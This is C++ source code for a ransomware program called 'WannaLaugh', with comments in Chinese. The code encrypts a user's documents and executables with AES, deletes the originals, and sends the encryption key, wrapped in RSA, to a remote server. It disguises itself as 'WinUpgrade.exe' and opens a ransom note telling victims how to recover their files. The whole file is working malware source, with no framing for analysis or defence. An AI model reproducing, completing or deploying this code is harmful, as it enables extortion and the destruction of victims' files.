#include <iostream>
#include <stdexcept>

#include "stdafx.h"
#include "config.h"
#include "tear.h"
#include "sendit_client.h"
#include "rsa_key_iv_server.h"

#ifdef _WIN32
#	include <windows.h>
#	include <Urlmon.h>
#	include <Lmcons.h>
#else
#	include <pwd.h>
#endif

using namespace std;
using namespace CryptoPP;

crypt_data *universal_d;

void tear_encrypt(const crypt_data* data, string path);
crypt_data* generatekey();
void tear_iterate(const CString& parent);
void tear_process(const CString& path);
string tear_get_username();
CString tear_get_home();
bool send_d();
void notify();
void write_iv();

//枚举要加密的文件类型，防止操作系统文件而引起崩溃，end是数组结束标记
const string encry_suffix[] = { ".txt",".exe",".pdf",".doc",".docx",".xlsx",".ppt",".pptx","end" };

/*
 * Message to display
 */

int tear_main(void) 
{
	//先检测当前目录有无iv.txt，如果有就不必重复感染
	std::ifstream test_file("iv.txt");
	string wait;
	if (test_file)
	{
		cout << "Please don't run the exe again\n";
		cin >> wait;
		return 10;
	}
	test_file.close();

	universal_d = generatekey();
	if (!send_d())
	{
		cout << "Please check your network settings and restart the exe again\n";
		cin >> wait;
		return 11;
	}


	CString path;	//经测试，get_home在Windows一般path为C:\Users\...\，省略号处为当前用户名
	for (int i = 0;i < LOCKED_CONTENT_NUM;i++) {//目标目录
		path = locked_content[i].c_str();
		path = tear_get_home() + path;
		tear_iterate(path);
	}
	
	path = ".";//exe所在目录
	tear_iterate(path);

	//path = tear_get_home() + _T("\\Documents\\Downloads");
	//tear_iterate(path);

	//path = tear_get_home() + _T("\\Downloads");
	//tear_iterate(path);

	write_iv();

	delete universal_d;

	notify();

	cout << "Your computer has been infected with WannaLaugh.\n If you want to restore the encrypted files, please follow the instructions in note.html\nInput any string to end the exe\n";
	
	cin >> wait;

	return 0;
}

void tear_encrypt(const crypt_data* d, string path) 
{
	
	string cipher;
	string plain;

	FileSource(path.c_str(), true, new StringSink(plain));

	// Print key and initialization vector
	/*
	string skey;
	StringSource(d->key, sizeof(d->key), true, new HexEncoder(new StringSink(skey)));
	cout << "Key:\t\t" << skey << endl;
	skey.clear();

	string siv;
	StringSource(d->iv, sizeof(d->iv), true, new HexEncoder(new StringSink(siv)));
	cout << "IV:\t\t" << siv << endl;
	siv.clear();
	*/
	//cout << "Plaintext:\t" << plain << endl;


	CBC_Mode<AES>::Encryption e;
	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);

	StreamTransformationFilter filter(e);
	filter.Put((const byte*) plain.data(), plain.size());
	filter.MessageEnd();

	const size_t ret = filter.MaxRetrievable();
	cipher.resize(ret);
	filter.Get((byte*) cipher.data(), cipher.size());
/*
#ifdef DEBUG
	string ciphertext;
	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
	cout << "Ciphertext:\t" << ciphertext << endl;
#endif
*/
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(cipher.c_str(), cipher.length());
	ofile.close();
	
}

crypt_data* generatekey() 
{
	crypt_data* d = new crypt_data;

	AutoSeededRandomPool prng;

	prng.GenerateBlock(d->key, sizeof(d->key));
	prng.GenerateBlock(d->iv, sizeof(d->iv));

	return d;
}

void tear_iterate(const CString& parent) 
{
	CFileFind end_itr;	//record the directory
	CString strpath;
	bool is_find = end_itr.FindFile(parent + _T("\\*"));

	while (is_find)
	{
		is_find = end_itr.FindNextFile();
		strpath = end_itr.GetFilePath();

		if (end_itr.IsDirectory() && !end_itr.IsDots())
		{
			tear_iterate(strpath);
		}
		else
		if (!end_itr.IsDirectory() && !end_itr.IsDots())
		{
			tear_process(strpath);
		}
	}
}

void tear_process(const CString& path) 
{
	int dot_pos = path.ReverseFind('.');
	int gang_pos = path.ReverseFind('\\');
	if (dot_pos <0 || dot_pos>=path.GetLength()) return;//遇到没有后缀的文件退出
	string file_name = CT2A(path.Mid(gang_pos + 1).GetBuffer());
	//不重复加密，不加密病毒自己的文件
	string file_suffix = CT2A(path.Mid(dot_pos).GetBuffer());
	if (file_suffix == LOCKED_EXTENSION) return;
	if (file_name == "WinUpgrade.exe") return;
	if (file_name == "WinUpgrade.ilk") return;
	if (file_name == "WinUpgrade.pdb") return;
	//枚举加密的文件类型
	bool can_encrypt = false;
	for(int i=0; encry_suffix[i]!="end";++i)
		if (encry_suffix[i] == file_suffix)
		{
			can_encrypt = true;
			break;
		}
	if (!can_encrypt) return;
	//cout << "Processing " << path << endl;
	//加密
	CString tmp_path = path;
	string str_path = CT2A(tmp_path.GetBuffer());
	tear_encrypt(universal_d, str_path);
	//删除文件
	size_t str_path_size = str_path.length();
	//change string to LPCWSTR
	wchar_t *delete_it_buffer = new wchar_t[str_path_size * sizeof(wchar_t) + 10];
	wmemset(delete_it_buffer, 0, str_path_size * sizeof(wchar_t) + 10);
	//LPCWSTR delete_it;
	MultiByteToWideChar(CP_ACP, 0, str_path.c_str(), str_path_size, delete_it_buffer, str_path_size * sizeof(wchar_t));
	//delete_it = delete_it_buffer;
	//cout << "deleteFile:" << *delete_it << endl;
	DeleteFile(delete_it_buffer);
}

string tear_get_username() 
{
#ifdef _WIN32
	LPWSTR username = new wchar_t[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(username, &length);
	wstring ws_username(username);
	string str_username = string(ws_username.begin(),ws_username.end());
	return str_username;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_name);
	}

	return EMPTY;
#endif
}
CString tear_get_home() 
{
#ifdef _WIN32
	CString path;

	char* drive = getenv("USERPROFILE");
	if (drive == NULL) 
	{
		throw runtime_error("USERPROFILE environment variable not found");
	} else 
	{
		path = drive;
	}

	return path;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_dir);
	}

	return EMPTY;
#endif
}

void notify() 
{

	if (OPEN_FILE) 
	{
		/*
		std::ofstream ofile(NOTIFY_FILENAME);
		for(int i=0; i<7; ++i) ofile.write(NOTIFY_MESSAGE[i], strlen(NOTIFY_MESSAGE[i]));
		ofile.close();
		*/
		rename("WinUpgrade.dll", NOTIFY_FILENAME);
		system((string("start ") + NOTIFY_FILENAME).c_str());
	}
}

bool send_d() 
{
	string skey;
	StringSource(universal_d->key, sizeof(universal_d->key), true, new HexEncoder(new StringSink(skey)));
	key_encode_rsa(skey);
	string siv;
	StringSource(universal_d->iv, sizeof(universal_d->iv), true, new HexEncoder(new StringSink(siv)));
	return sendit(skey, siv);
}

void write_iv()
{
	std::ofstream ofile("iv.txt", std::ios::binary);
	string siv;
	StringSource(universal_d->iv, sizeof(universal_d->iv), true, new HexEncoder(new StringSink(siv)));
	ofile.write(siv.c_str(), siv.length());
	siv.clear();
	ofile.close();
}